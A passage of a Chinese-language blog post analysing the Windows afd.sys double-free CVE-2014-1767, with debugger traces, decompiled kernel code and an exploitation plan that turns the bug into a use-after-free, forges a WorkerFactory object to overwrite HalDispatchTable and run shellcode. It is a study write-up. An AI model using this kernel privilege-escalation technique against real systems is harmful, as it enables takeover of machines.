<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">kd&gt; p</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">afd!AfdTransmitFile+0x17f:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">0008:8e65749d ff1578a2648e    call    dword ptr [afd!_imp__MmProbeAndLockPages (8e64a278)]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">kd&gt; dd 13371337 </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">13371337  ???????? ???????? ???????? ????????</span></pre></td></tr></table></figure>

<p>如果我们继续调试的话，程序就会跑飞，这是因为在之后进行了异常处理，程序的执行流被改变了，我们需要在正确的异常处理位置下断点，才能重新接管控制流，如何找到正确的位置呢，我们在触发异常的位置向上找如下的基本块</p>
<p><img src="/.com//../../../cve-2014-1767/image-20191111184338697.png" alt="image-20191111184338697"></p>
<p>这里就是一个指引了，我们在所谓的loc_2C840处下断，然后执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">kd&gt; g</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">Breakpoint 3 hit</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">afd!AfdTransmitFile+0x522:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">0008:8e657840 8b65e8          mov     esp,dword ptr [ebp-18h]</span></pre></td></tr></table></figure>

<p>果然断了下来，接下来就会调用AfdReturnTpInfo函数了，主要是完成一些收尾工作，即释放内存，这里会调用IoFreeMdl函数，且函数执行后该成员并未置空，这就产生了悬挂指针，此时若再次调用AfdReturnTpInfo，就会因为二次释放导致crash，接着我们来分析第二次DeviceIoControl。</p>
<p>在AfdTransmitPackets函数下断点，前面依旧是一些比对，先步过就行，接着又会调用AfdTliGetTpInfo，此时查看下参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">kd&gt; r</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">eax&#x3D;00000010 ebx&#x3D;87676b88 ecx&#x3D;0aaaaaaa edx&#x3D;00000000 esi&#x3D;00133588 edi&#x3D;8b043a84</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">eip&#x3D;8e830bb5 esp&#x3D;8b043a4c ebp&#x3D;8b043aec iopl&#x3D;0         nv up ei pl nz na pe nc</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">cs&#x3D;0008  ss&#x3D;0010  ds&#x3D;0023  es&#x3D;0023  fs&#x3D;0030  gs&#x3D;0000             efl&#x3D;00000206</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">afd!AfdTransmitPackets+0x129:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">8e830bb5 e869ecffff      call    afd!AfdTliGetTpInfo (8e82f823)</span></pre></td></tr></table></figure>

<p>AfdTliGetTpInfo的参数在ecx中，可以看到其值为0xaaaaaaa，这也是poc中设置好的，若这里直接step over这行指令，则程序会直接跑飞，这熟悉的即视感说明再次触发了异常。那这次仔细来看AfdTliGetTpInfo的内部</p>
<p><img src="/.com//../../../cve-2014-1767/image-20191112102719892.png" alt="image-20191112102719892"></p>
<p>可以看到，若这里的参数大于AfdDefaultTpInfoElementCount后，会调用ExAllocatePoolWithQuotaTag分配额外的空间，且其大小为24*ecx，由于这里的ecx过大，在32位中分配不了，这导致了一个异常，而异常触发后就会再次调用AfdReturnTpInfo，这将对之前的Mdl进行二次释放。</p>
<h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><p>虽然就poc来说，这里是由于双重释放导致的crash，但本质上是释放后指针未置空，所以这可以直接转换为一个UAF。由于Mdl的大小是我们的输入决定的，所以我们需要申请一个可以进行任意地址写的对象覆盖到该位置，然后将其二次释放，最后伪造一个结构到此处，并进行写操作，这就转换为了一个UAF的利用。我们接下来详细说明每个步骤，当然，该exp思路由该<a href="http://www.siberas.de/papers/Pwn2Own_2014_AFD.sys_privilege_escalation.pdf" target="_blank" rel="noopener">白皮书</a>提供。</p>
<p>首先我们需要找到可以通过API进行任意地址写的对象，该对象是WorkerFactory，我们可以通过NtCreateWorkerFactory来创建它，以及NtSetInfomationWorkerFactory来对其字段进行写操作。</p>
<p>首先第一个问题是，我们希望用NtCreateWorkerFactory来申请一个此对象来覆盖释放过后的Mdl对象，而Mdl的大小是根据输入可控的，所以一旦知晓WorkerFactory对象的大小，就可以通过调整输入来进行覆盖。要想知道其大小其实很容易，只要找到NtCreateWorkerFactory最后如何分配的内存池即可，而最后是在ObpAllocateObject函数中调用的ExAllocatePoolWithTag ：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">nt!ObpAllocateObject+0xdd:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">840414ba e846abefff      call    nt!ExAllocatePoolWithTag (83f3c005)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">kd&gt; dd esp</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">8bdbcb3c  00000000 000000a0 ef577054 83f46d20</span></pre></td></tr></table></figure>

<p>可以看到其大小为0xa0了。于是我们需要构造大小为0xa0的Mdl对象，以便Mdl释放后，WorkerFactory可以覆盖。我们来看看IoAllocateMdl是如何申请内存池的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">PMDL __<span class="function">stdcall <span class="title">IoAllocateMdl</span><span class="params">(PVOID VirtualAddress, ULONG Length, BOOLEAN SecondaryBuffer, BOOLEAN ChargeQuota, PIRP Irp)</span></span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"><span class="function"></span>&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// edi</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">  ULONG v6; <span class="comment">// ebx</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">  ULONG v7; <span class="comment">// eax</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">  SIZE_T v8; <span class="comment">// eax</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">  _KPRCB *v9; <span class="comment">// eax</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">  _GENERAL_LOOKASIDE *v10; <span class="comment">// esi</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">  PMDL result; <span class="comment">// eax</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">  _GENERAL_LOOKASIDE *v12; <span class="comment">// esi</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">  ULONG v13; <span class="comment">// ST08_4</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">  PMDL i; <span class="comment">// ecx</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [esp+8h] [ebp-10h]</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">  CSHORT v16; <span class="comment">// [esp+14h] [ebp-4h]</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">  _KPRCB *VirtualAddressa; <span class="comment">// [esp+20h] [ebp+8h]</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">  v16 = <span class="number">0</span>;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">  v5 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)VirtualAddress;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">  v6 = ((Length &amp; <span class="number">0xFFF</span>) + ((<span class="keyword">unsigned</span> __int16)VirtualAddress &amp; <span class="number">0xFFF</span>) + <span class="number">0xFFF</span>) &gt;&gt; <span class="number">12</span>;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">  v7 = v6 + (Length &gt;&gt; <span class="number">12</span>);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">  v15 = (<span class="keyword">unsigned</span> __int16)VirtualAddress &amp; <span class="number">0xFFF</span>;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> ( v7 &gt; <span class="number">0x11</span> )</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">  &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">    v8 = <span class="number">4</span> * v7 + <span class="number">28</span>;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">    <span class="keyword">goto</span> LABEL_8;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">  &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">LABEL_8:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line">    result = (PMDL)ExAllocatePoolWithTag(<span class="number">0</span>, v8, <span class="number">0x206C644D</span>u);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> ( !result )</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line">      <span class="keyword">return</span> result;  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">31</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>

<p>这里经过了一些位运算，而已知v8是0xa0，且VirtualAddress也是我们已知的0x13371337来触发异常，所以可以倒推出Length为0x20000，这个倒推过程很容易。这样第一次的覆盖就完成了。</p>
<p>第二个问题是，在释放WorkerFactory对象后，如何伪造一个该对象，供我们操作。通常来说，创建一个对象的API的参数很难控制该对象的成员字段，不过NtQueryEaFile是通过下面这段代码分配的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">if ( ViVerifierDriverAddedThunkListHead )</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">    v18 &#x3D; ExAllocatePoolWithTagPriority(</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">    0,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">    NumberOfBytes,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">    0x20206F49u,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">    (EX_POOL_PRIORITY)((MmVerifierData &amp; 0x10 | 0x40u) &gt;&gt; 1));</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">    if ( !v18 )</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">    goto LABEL_22;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">else</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">	v18 &#x3D; ExAllocatePoolWithQuotaTag(0, NumberOfBytes, 0x20206F49u);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">P &#x3D; v18;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">ms_exc.registration.TryLevel &#x3D; -2;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">memcpy(v18, a6, NumberOfBytes);</span></pre></td></tr></table></figure>

<p>可以看到参数6内的数据会被复制到新申请的空间中，这说明我们可以自定义释放后的结构了。那么我们伪造的结构应该如何布局呢？这就得看NtSetInfomationWorkerFactory是写的哪个字段了，</p>
<p><img src="/.com//../../../cve-2014-1767/image-20191114201404816.png" alt="image-20191114201404816"></p>
<p>可以看到就是偏移0x10的位置，在WorkerFactory的该字段进行写。但这里有一个需要注意的点是，经过调试，NtCreateWorkerFactory传回的指针并非就是ExAllocatePoolWigthTag返回的地址，而是其+0x28处，所以在伪造结构时，可写地址应放到+0x38的位置，如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">pushad</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">mov eax, AllocAddr	&#x2F;&#x2F;起始地址</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">mov dword ptr[eax + 4], 0xa8</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">mov dword ptr[eax + 10h], 2</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">mov dword ptr[eax + 14h], 1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">mov dword ptr[eax + 1ch], 80016h</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">mov dword ptr[eax + 28h], 20000028h</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">mov ebx, uHalDispatchTable</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">sub ebx, 18h</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">mov dword ptr[eax + 38h], ebx	&#x2F;&#x2F;可写地址</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">popad</span></pre></td></tr></table></figure>

<p>伪造完成后，我们再次释放WorkerFactory对象，构成一个悬挂指针，然后调用NtQueryEaFile将我们伪造的对象放入其中，这样就可以进行任意地址写了。之后将shellcode地址写入HalDispatchTable+4，并调用 NtQueryIntervalProfile来执行shellcode即可。</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>这个bug的关键点其实是构造异常，以此强制进行释放操作，说明异常处理这个点是值得关注的。在利用中提出了WorkerFactory对象及其相关API，可用于任意地址写；以及自定义数据的NtQueryEaFile，这在需要UAF利用的场景都可通用。</p>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://bbs.pediy.com/thread-194457.htm" target="_blank" rel="noopener"> https://bbs.pediy.com/thread-194457.htm </a></p>
<p><a href="http://www.siberas.de/papers/Pwn2Own_2014_AFD.sys_privilege_escalation.pdf" target="_blank" rel="noopener">http://www.siberas.de/papers/Pwn2Own_2014_AFD.sys_privilege_escalation.pdf</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/11/29/cve-2014-1767/" data-id="ck3jwr2eh0000gwu04sjd7bbf" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  


</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2019/11/29/cve-2014-1767/">cve-2014-1767</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2019 John Doe<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>



  </div>
</body>
</html>